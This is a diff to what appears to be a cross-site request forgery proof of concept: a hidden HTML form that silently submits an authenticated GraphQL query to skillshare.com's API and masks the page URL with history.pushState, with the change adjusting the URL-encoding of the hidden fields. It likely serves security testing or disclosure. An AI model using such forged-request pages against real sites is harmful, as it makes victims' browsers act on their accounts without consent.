@@ -2,8 +2,8 @@
   
   <script>history.pushState('', '', '/')</script>
     <form action="https://www.skillshare.com/api/graphql">
-      <input type="hidden" name="query" value="query viewerContext($isAuthenticated: Boolean!) { viewer @include(if: $isAuthenticated) { firstName } }&variables={"isAuthenticated":true}" />
-      <input type="hidden" name="variables" value="{"isAuthenticated":true}" />
+      <input type="hidden" name="query" value="query%20viewerContext($isAuthenticated:%20Boolean!)%20{%20viewer%20@include(if:%20$isAuthenticated)%20{%20firstName%20}%20}" />
+      <input type="hidden" name="variables" value="{%22isAuthenticated%22:true}" />
       <input type="submit" value="Submit request" />
     </form>
   
